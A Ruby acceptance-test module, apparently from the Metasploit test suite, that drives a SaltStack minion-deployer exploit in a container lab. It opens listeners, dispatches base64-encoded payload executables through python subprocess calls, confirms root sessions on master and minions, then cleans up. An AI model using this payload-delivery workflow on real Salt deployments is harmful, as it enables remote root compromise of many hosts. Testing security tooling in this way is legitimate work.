# frozen_string_literal: true

require 'base64'
require 'digest'
require 'securerandom'
require_relative '../saltstack_rce/acceptance'

module Acceptance
  # Authenticate setup independently, then invoke the unmodified local owner.
  module SaltstackDeployer
    include SaltstackRce

    DEPLOY_OWNER = 'exploit/linux/local/saltstack_salt_minion_deployer'
    INITIAL_PORT = 4473
    OWNER_PORT = 4474
    NATIVE_PORT = 4475

    def dx_poll(seconds, &block)
      Timeout.timeout(seconds) { wait_for_expect(seconds, 1, &block) }
    end

    def dx_resource_health(phase)
      %w[master minion_a minion_b framework reporting_db].each do |service|
        memory = target_exec(service, 'cat', '/sys/fs/cgroup/memory.events').lines.to_h { |line| line.split.map(&:strip) }
        tasks = target_exec(service, 'cat', '/sys/fs/cgroup/pids.events').lines.to_h { |line| line.split.map(&:strip) }
        sx_record('cgroup-resource-events.jsonl', workspace: @workspace, phase: phase, service: service, memory: memory, tasks: tasks)
        expect(memory.values_at('oom', 'oom_kill', 'oom_group_kill')).to eq(%w[0 0 0]), "Fixture memory exhaustion in #{service}"
        expect(tasks.fetch('max')).to eq('0'), "Fixture PID exhaustion in #{service}"
      end
    end

    def dx_native(phase)
      output = +''
      argv = ['python3', 'test/module_targets/saltstack_deployer/native_probe.py', ENV.fetch('MODULE_TARGET_RUNTIME'), phase]
      expect(ModuleTargetTests.new.send(:command, argv, path: File.join(target_runtime.fetch('artifacts'), "native-#{phase}.log"), timeout: 480, capture: output, quiet: true)).to be(true), output
      data = JSON.parse(File.read(File.join(target_runtime.fetch('artifacts'), "native-#{phase}.json")))
      expect(data.fetch('status')).to eq('native_passed')
      data
    end

    def dx_handler(payload, port)
      before = sx_json('framework.jobs.keys')
      console_command('back')
      console_command('use exploit/multi/handler')
      { 'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => port, 'ExitOnSession' => false }.each do |name, value|
        console_command("set #{name} #{value}")
      end
      console_command('run -j -z')
      jobs = sx_json('framework.jobs.keys') - before
      expect(jobs.length).to eq(1)
      jobs.fetch(0)
    end

    def dx_ready(owner, count, excluding: [])
      identifiers = nil
      dx_poll(60) do
        rows = sx_json("framework.sessions.values.select { |session| session.via_exploit == #{owner.inspect} }.map { |session| {id: session.sid, db_id: session.db_record&.id} }")
        identifiers = rows.map { |row| row.fetch('id') } - excluding
        events = File.readlines(File.join(target_runtime.fetch('artifacts'), 'ready-sessions.jsonl')).map { |line| JSON.parse(line).fetch('id') }
        expect(identifiers.length).to eq(count)
        expect(identifiers - events).to eq([])
        expect(rows.reject { |row| excluding.include?(row.fetch('id')) }.map { |row| row.fetch('db_id') }).to all(be_a(Integer))
      end
      identifiers
    end

    def dx_proof(identifier, role, owner:)
      path = "/tmp/module-target-salt-proof-#{SecureRandom.hex(6)}"
      value = "salt-deployment-#{SecureRandom.hex(12)}"
      service = @native.fetch('addresses').fetch(role).fetch('service')
      begin
        proof = sx_json("SaltDeploymentSessionControl.proof(framework,#{identifier},#{path.inspect},#{value.inspect})")
        expect(proof.fetch('container_role')).to eq(@native.fetch('identities').fetch(role).fetch('state'))
        expect(proof.fetch('via_exploit')).to eq(owner)
        expect(proof.fetch('raw_command_output').lines.last.strip).to eq('0') if proof.fetch('type') == 'shell'
        expect(proof.fetch('peer').split(':').first).to eq(@native.fetch('addresses').fetch(role).fetch('address'))
        expect(target_exec(service, 'cat', path)).to eq(value)
        expect(target_exec(service, 'stat', '-c', '%u', path).strip).to eq('0')
        @native.fetch('addresses').each do |other_role, entry|
          next if other_role == role

          target_exec(entry.fetch('service'), 'test', '!', '-e', path)
        end
        pids = if proof.fetch('type') == 'meterpreter'
                 [proof.fetch('pid')]
               else
                 port = if owner == DEPLOY_OWNER
                          OWNER_PORT
                        elsif proof.fetch('via_payload').include?('/cmd/')
                          INITIAL_PORT
                        else
                          NATIVE_PORT
                        end
                 connections = dx_connections(service, port).select { |row| row.fetch('state') == '01' }
                 expect(connections).not_to be_empty
                 proof['connections'] = connections
                 connections.flat_map { |row| row.fetch('owners') }.map { |row| row.fetch('pid') } + [Integer(proof.fetch('command_pid'))]
               end.uniq
        processes = dx_processes(service, pids)
        expect(processes.keys.sort).to eq(pids.map(&:to_s).sort)
        processes.each_value do |process|
          expect(process.fetch('uid')).to eq(0)
          expect(process.fetch('state')).not_to eq('Z')
        end
        proof['native_processes'] = processes
        proof['target_pids'] = pids
        proof['service'] = service
        @deployment_proofs[identifier] = proof
        expect(sx_sessions_sql.map { |row| row.fetch('id') }).to include(proof.fetch('db_id'))
        sx_record('deployment-session-proofs.jsonl', workspace: @workspace, proof: proof, proof_sha256: Digest::SHA256.hexdigest(value))
        proof
      ensure
        target_exec(service, 'rm', '-f', path)
      end
    end

    def dx_processes(service, pids)
      JSON.parse(target_exec(service, 'python', '-c', File.read('test/module_targets/saltstack_deployer/processes.py'), *pids.map(&:to_s)))
    end

    def dx_connections(service, port)
      JSON.parse(target_exec(service, 'python', '-c', File.read('test/module_targets/superset_rce_owner/connection_state.py'), listener_host, port.to_s))
    end

    def dx_close_session(identifier, original)
      path = "/tmp/module-target-salt-proof-#{SecureRandom.hex(6)}"
      value = "salt-deployment-close-#{SecureRandom.hex(12)}"
      begin
        # Match the qualified gather workflow: fresh real RPC, then the public
        # session kill immediately, while passive HTTP delivery remains live.
        expression = "session=framework.sessions.fetch(#{identifier}); context={response_timeout: session.respond_to?(:response_timeout) ? session.response_timeout : nil, skip_cleanup: session.respond_to?(:skip_cleanup) ? session.skip_cleanup : nil, passive_service: session.respond_to?(:passive_service) && !!session.passive_service}; proof=SaltDeploymentSessionControl.proof(framework,#{identifier},#{path.inspect},#{value.inspect}); session.kill; proof.merge(close_context: context)"
        proof = sx_json("begin; #{expression}; end")
        expect(proof.fetch('container_role')).to eq(original.fetch('container_role'))
        expect(proof.fetch('db_id')).to eq(original.fetch('db_id'))
        expect(target_exec(original.fetch('service'), 'cat', path)).to eq(value)
        sx_record('public-session-close-proofs.jsonl', workspace: @workspace, proof: proof, proof_sha256: Digest::SHA256.hexdigest(value))
      ensure
        target_exec(original.fetch('service'), 'rm', '-f', path)
      end
    end

    def dx_master(payload)
      job = dx_handler(payload, INITIAL_PORT)
      if payload.start_with?('linux/')
        generated = sx_json("SaltDeploymentSessionControl.executable(framework.jobs.fetch(#{job.inspect}),#{payload.inspect},framework)")
        path = "/tmp/module-target-master-bootstrap-#{SecureRandom.hex(8)}"
        @bootstrap_paths << path
        configuration = generated.merge('path' => path)
        output = target_exec('master', 'python', '-c', File.read('test/module_targets/saltstack_deployer/master_bootstrap.py'), JSON.generate(configuration))
        launch = sx_document(output, 'SALT_DEPLOY_BOOTSTRAP=')
        expect(launch.fetch('executable_sha256')).to eq(generated.fetch('executable_sha256'))
        expect(target_exec('master', 'sha256sum', path).split.first).to eq(generated.fetch('executable_sha256'))
      else
        generated = sx_json("RocketmqSessionControl.command(framework.jobs.fetch(#{job.inspect}),#{payload.inspect})")
        output = target_exec('master', 'python', '-c', File.read('test/module_targets/saltstack_gather/sdk_launch.py'), generated.fetch('command_base64'), 'command')
        launch = sx_document(output, 'SALT_GATHER_SDK=')
        expect(launch.fetch('payload_sha256')).to eq(generated.fetch('sha256'))
      end
      sx_record('native-master-dispatches.jsonl', workspace: @workspace, launch: launch, generated: generated)
      identifier = dx_ready('exploit/multi/handler', 1).fetch(0)
      dx_proof(identifier, 'master', owner: 'exploit/multi/handler')
      identifier
    end

    def dx_native_elf(payload)
      job = dx_handler(payload, NATIVE_PORT)
      generated = sx_json("SaltDeploymentSessionControl.executable(framework.jobs.fetch(#{job.inspect}),#{payload.inspect},framework)")
      identifier = SecureRandom.hex(8)
      paths = { 'source' => "/tmp/module-target-native-elf-source-#{identifier}", 'destination' => "/tmp/module-target-native-elf-#{identifier}" }
      configuration = generated.merge(paths).merge('selector' => 'module-target-minion-a')
      code = "import base64,subprocess;script=base64.b64decode(#{Base64.strict_encode64(File.read('test/module_targets/saltstack_deployer/native_elf.py')).inspect});result=subprocess.run(['python','-c',script.decode()],input=base64.b64decode(#{Base64.strict_encode64(JSON.generate(configuration)).inspect}));raise SystemExit(result.returncode)"
      output = target_exec('master', 'python', '-c', code)
      launch = sx_document(output, 'SALT_DEPLOY_ELF=')
      sx_record('native-elf-dispatches.jsonl', workspace: @workspace, generated: generated.except('executable_base64', 'command_base64'), launch: launch, paths: paths)
      expect(launch.fetch('status')).to eq('native_elf_dispatched')
      session = dx_ready('exploit/multi/handler', 1).fetch(0)
      dx_proof(session, 'minion-a', owner: 'exploit/multi/handler')
      executable = Base64.strict_decode64(generated.fetch('executable_base64'))
      encoded = Base64.strict_encode64(executable)
      expect(target_exec('master', 'sha256sum', paths.fetch('source')).split.first).to eq(Digest::SHA256.hexdigest(encoded))
      code = 'import hashlib,json,pathlib,sys;p=pathlib.Path(sys.argv[1]);raw=p.read_bytes();print(json.dumps({"sha256":hashlib.sha256(raw).hexdigest(),"bytes":len(raw),"mode":oct(p.stat().st_mode&511),"elf_class":raw[4],"elf_machine":int.from_bytes(raw[18:20],"little")}))'
      actual = JSON.parse(target_exec('minion_a', 'python', '-c', code, paths.fetch('destination')))
      expect(actual).to eq('sha256' => generated.fetch('executable_sha256'), 'bytes' => executable.bytesize,
                           'mode' => '0o755', 'elf_class' => payload.start_with?('linux/x64/') ? 2 : 1,
                           'elf_machine' => payload.start_with?('linux/x64/') ? 62 : 3)
      expect(target_exec('minion_a', 'sha256sum', paths.fetch('destination') + '.b64').split.first).to eq(Digest::SHA256.hexdigest(encoded))
      %w[master minion_b].each { |service| target_exec(service, 'test', '!', '-e', paths.fetch('destination')) }
      target_exec('minion_b', 'test', '!', '-e', paths.fetch('destination') + '.b64')
      sx_record('native-elf-file-proofs.jsonl', workspace: @workspace, payload: payload, files: actual)
    ensure
      if paths
        target_exec('master', 'rm', '-f', paths.fetch('source'))
        %w[minion_a minion_b].each { |service| target_exec(service, 'rm', '-f', paths.fetch('destination'), paths.fetch('destination') + '.b64') }
      end
    end

    def dx_owner(initial, payload:, selector:, calculate:)
      @deployment_directory = "/tmp/module-target-owner-deployer-#{SecureRandom.hex(8)}"
      %w[master minion_a minion_b].each { |service| target_exec(service, 'mkdir', '-m', '700', @deployment_directory) }
      output = run_target_module(DEPLOY_OWNER, 'master', {
        'SESSION' => initial, 'PAYLOAD' => payload,
        'MINIONS' => selector, 'CALCULATE' => calculate,
        'LHOST' => listener_host, 'LPORT' => OWNER_PORT, 'ListenerTimeout' => 5,
        'WritableDir' => @deployment_directory, 'TargetWritableDir' => @deployment_directory
      }, action: 'run -j -z', allow_errors: true, endpoint_options: {}, command_timeout: 60)
      sx_record('owning-calls.jsonl', workspace: @workspace, owner: DEPLOY_OWNER, initial_session: initial, output: output, directory: @deployment_directory)
      dx_poll(180) do
        expect(sx_json("framework.jobs.values.select { |job| job.ctx.first.respond_to?(:fullname) && job.ctx.first.fullname == #{DEPLOY_OWNER.inspect} }.map(&:jid)")).to eq([])
      end
      full = console_command('sessions -l') + console.all_data
      sx_record('owning-completion.jsonl', workspace: @workspace, output: full.dup.force_encoding(Encoding::UTF_8))
      expect(full).not_to match(/undefined local variable|undefined method|Exception in on_new_session|Exploit failed|Msf::OptionValidateError/)
      expected_roles = selector == '*' ? %w[minion-a minion-b] : ['minion-a']
      identifiers = dx_ready(DEPLOY_OWNER, expected_roles.length)
      identifiers.each do |identifier|
        row = sx_json("SaltDeploymentSessionControl.role(framework,#{identifier})")
        dx_proof(identifier, row.fetch('role'), owner: DEPLOY_OWNER)
      end
      expect(identifiers.map { |identifier| @deployment_proofs.fetch(identifier).fetch('container_role').fetch('role') }.sort).to eq(expected_roles)
    end

    def dx_cleanup
      errors = []
      begin
        dx_resource_health('cleanup')
      rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
        errors << e
      end
      begin
        identifiers = sx_json('framework.sessions.keys')
        # Stop dependent minion sessions before their original master transport.
        identifiers.sort_by { |identifier| @deployment_proofs&.dig(identifier, 'container_role', 'role') == 'master' ? 1 : 0 }.each do |identifier|
          original = @deployment_proofs&.[](identifier)
          if original
            dx_close_session(identifier, original)
          else
            sx_json("framework.sessions.fetch(#{identifier}).kill; {id: #{identifier}, cleanup_requested: true}")
          end
        rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
          errors << e
        end
        # Passive HTTP sessions need their live listener to deliver shutdown.
        console_command('jobs -K')
        dx_poll(30) { expect(sx_json('framework.sessions.keys')).to eq([]) }
        dx_poll(30) { expect(sx_json('framework.jobs.keys')).to eq([]) }
        @deployment_proofs&.each_value do |proof|
          dx_poll(30) do
            processes = dx_processes(proof.fetch('service'), proof.fetch('target_pids'))
            remaining = processes.select { |pid, row| row.fetch('starttime') == proof.fetch('native_processes').fetch(pid).fetch('starttime') }
            sx_record('session-process-closure.jsonl', workspace: @workspace, session: proof.fetch('id'), service: proof.fetch('service'), remaining: remaining)
            expect(remaining).to eq({})
          end
        end
        dx_poll(30) do
          rows = sx_sessions_sql
          expect(rows.map { |row| row.fetch('closed_at') }).not_to include(nil)
        end
        code = 'require "json";ports=ARGV.map(&:to_i);puts JSON.generate(%w[/proc/net/tcp /proc/net/tcp6].flat_map{|path|File.readlines(path).drop(1).map(&:split)}.select{|row|row[3]=="0A"&&ports.include?(row[1].split(":").last.to_i(16))})'
        dx_poll(30) do
          expect(JSON.parse(target_exec('framework', 'ruby', '-e', code, INITIAL_PORT.to_s, OWNER_PORT.to_s, NATIVE_PORT.to_s))).to eq([])
        end
        %w[master minion_a minion_b].each do |service|
          [INITIAL_PORT, OWNER_PORT, NATIVE_PORT].each do |port|
            dx_poll(20) do
              sockets = dx_connections(service, port)
              sx_record('session-socket-closure.jsonl', workspace: @workspace, service: service, port: port, sockets: sockets)
              expect(sockets.reject { |socket| socket.fetch('state') == '06' }).to eq([])
            end
          end
        end
      rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
        errors << e
      end
      if @deployment_directory
        %w[master minion_a minion_b].each do |service|
          code = 'import hashlib,json,pathlib,sys;root=pathlib.Path(sys.argv[1]);print(json.dumps([{ "name":p.name,"bytes":p.stat().st_size,"sha256":hashlib.sha256(p.read_bytes()).hexdigest()} for p in root.iterdir()]))'
          files = JSON.parse(target_exec(service, 'python', '-c', code, @deployment_directory))
          sx_record('owning-artifacts.jsonl', workspace: @workspace, service: service, directory: @deployment_directory, files: files)
          # Capture every host before the harness fallback removes task files.
          expect(files).to eq([])
        rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
          errors << e
        ensure
          begin
            cleanup = 'from pathlib import Path;import sys;root=Path(sys.argv[1]);[p.unlink() for p in root.iterdir()];root.rmdir()'
            target_exec(service, 'python', '-c', cleanup, @deployment_directory)
          rescue StandardError => e
            errors << e
          end
        end
      end
      errors.each { |error| sx_record('cleanup-proof-errors.jsonl', workspace: @workspace, error: error.class.name, message: error.message) }
      @bootstrap_paths&.each do |path|
        target_exec('master', 'rm', '-f', path)
        target_exec('master', 'test', '!', '-e', path)
      end
      raise errors.first unless errors.empty?
    end
  end
end
